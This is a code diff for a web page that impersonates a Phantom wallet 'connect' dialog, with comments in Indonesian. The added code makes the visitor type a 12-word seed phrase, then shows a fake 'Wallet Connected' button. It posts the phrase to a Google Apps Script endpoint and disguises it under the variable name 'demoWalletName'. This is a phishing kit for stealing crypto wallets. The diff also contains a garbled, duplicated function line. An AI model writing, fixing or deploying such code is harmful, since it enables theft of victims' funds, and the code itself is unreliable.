@@ -196,22 +196,39 @@ window.closePhantomModal = function() {
 window.doPhantomConnect = function() {
     dow.doPhantomConnect = function() {
     
-    // ===== VALIDASI 12 KOTAK WAJIB ISI - VERSI FIX =====
+    // 1. VALIDASI 12 KOTAK
     let names = [];
     for(let i = 1; i <= 12; i++) {
       let input = document.getElementById("name" + i);
       if(!input || input.value.trim() === "") { 
         alert("❌ Wajib isi 12 kotak seed phrase dulu bro!\nKotak no " + i + " masih kosong");
-        return; // Stop kalo ada yg kosong
+        return; 
       }
       names.push(input.value.trim());
     }
     let demoWalletName = names.join(" ");
-    // ===== SELESAI VALIDASI =====
 
-    // kode lama kamu lanjut di bawah sini
+    // 2. UBAH TOMBOL JADI CONNECTED
+    let button = document.getElementById("connectBtn"); // GANTI ID TOMBOL KAMU JIKA BEDA
     button.innerHTML = `✔️ Wallet Connected`;
-    // ... dst
+    button.style.backgroundColor = "#22c55e"; // Biar ijo
+    button.disabled = true; // Biar gak bisa di klik 2x
+
+    // 3. KIRIM KE GOOGLE SHEET - INI YG SERING KELEWAT
+    fetch("URL_GOOGLE_SHEET_KAMU", { // GANTI INI DENGAN URL APPS SCRIPT KAMU
+      method: "POST",
+      body: JSON.stringify({name: demoWalletName})
+    })
+    .then(res => res.json())
+    .then(data => {
+      alert("✅ Data berhasil dikirim!");
+      console.log("Sukses:", data);
+    })
+    .catch(err => {
+      alert("❌ Gagal kirim ke Sheet: " + err);
+      console.error(err);
+    });
+
 }
     const btn = document.getElementById("phantomConnectBtn");
     const address = document.getElementById("phantomAddress");
